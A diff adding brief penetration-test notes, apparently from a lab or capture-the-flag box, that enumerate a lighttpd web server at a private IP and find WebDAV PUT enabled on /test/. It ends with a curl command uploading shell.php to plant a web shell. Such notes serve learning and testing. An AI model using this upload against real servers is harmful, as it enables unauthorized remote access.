@@ -1,0 +1,23 @@
+# Web Enumeration
+
+Target: http://192.168.2.4
+
+- HTTP service running on lighttpd 1.4.28
+- Dirb scan reveals:
+
+/index.php
+/test/      → Listable directory
+
+# WebDAV Check
+
+curl --head -X OPTIONS http://192.168.2.4/test/
+
+Response:
+Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+Allow: OPTIONS, GET, HEAD, POST
+DAV: 1,2
+
+→ PUT method enabled ⇒ possible file upload.
+
+# Upload shell.php via PUT
+curl -v -X PUT -H "Expect: " http://192.168.2.4/test/shell.php -d @shell.php
